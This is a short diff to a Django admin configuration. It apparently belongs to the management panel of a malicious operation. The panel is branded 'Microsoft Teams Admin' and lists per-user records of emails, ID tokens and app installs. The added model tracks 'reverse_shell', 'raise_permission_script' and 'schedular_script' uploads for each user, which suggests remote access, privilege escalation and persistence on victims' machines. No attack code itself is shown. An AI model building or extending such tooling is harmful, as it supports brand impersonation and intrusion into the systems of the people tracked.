@@ -1,6 +1,6 @@
 from django.contrib import admin
 from .forms import LizzyForm, NadiaForm 
-from core.models import  LizzyProfile, NadiaProfile
+from core.models import  LizzyProfile, NadiaProfile, Uploadedfiles
 
 
 admin.site.site_header = 'Microsoft Teams Admin'
@@ -21,3 +21,9 @@ class NadiaUserProfile(admin.ModelAdmin):
     list_filter = ('email', 'created', 'app_installed', 'app_downloaded')
     search_filter = ('email', 'id_token', 'video_link', 'first_name')
     list_display_links = ('id', 'email')
+    
+    
+@admin.register(Uploadedfiles)
+class UploadedFiles(admin.ModelAdmin):
+    list_display =  ('id', 'user', 'reverse_shell', 'router', 'raise_permission_script', 'schedular_script', 'created', 'updated', )
+    list_display_links = ('id', 'user')
